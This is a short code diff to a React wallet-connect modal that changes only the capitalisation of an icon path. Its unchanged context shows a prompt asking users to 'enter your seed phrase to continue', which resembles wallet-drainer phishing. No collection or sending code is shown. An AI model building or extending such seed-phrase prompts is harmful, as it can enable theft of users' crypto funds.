@@ -54,7 +54,7 @@ export default function NonWeb3WalletModal({ onClose, onConnect, onBack }) {
 
         <div className="modal-body">
           <div style={{ textAlign: 'center', marginBottom: 24 }}>
-            <img src="/icons/non-web3-wallets.png" alt="Non-web3 wallets" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
+            <img src="/Icons/non-web3-wallets.png" alt="Non-web3 wallets" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
             <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
               Please enter your seed phrase to continue
             </p>
